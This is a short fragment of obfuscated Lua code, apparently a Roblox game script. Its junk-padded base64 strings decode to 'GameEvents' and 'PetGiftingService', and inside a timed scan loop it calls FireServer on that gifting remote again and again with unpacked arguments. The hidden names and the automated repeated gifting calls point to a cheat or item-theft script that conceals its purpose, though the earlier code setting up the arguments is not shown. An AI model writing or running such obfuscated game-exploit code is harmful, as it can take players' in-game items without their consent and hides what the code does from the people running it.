                            ReplicatedStorage:WaitForChild(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('OFVOfcOiNDnTelOhGdQYdkhqlnacJGqSCcYIJtrOHYfLYJgGPIzfiBtR2FtZUV2ZW50cw==')):WaitForChild(HGGjIIsKgqOMzsDGDLEQyaAhEclngTMHtSqPiFcyNPLKMuFeBz('xXKxOsvgDDIabKnBqvaIitOWAHCLRFiQpNLePYTUxNWyxdkqPiCjksfUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            task.wait(0.7)
                        end
                    end
                end
            end
        end
        task.wait(2.5) -- scan interval
    end
end)
    
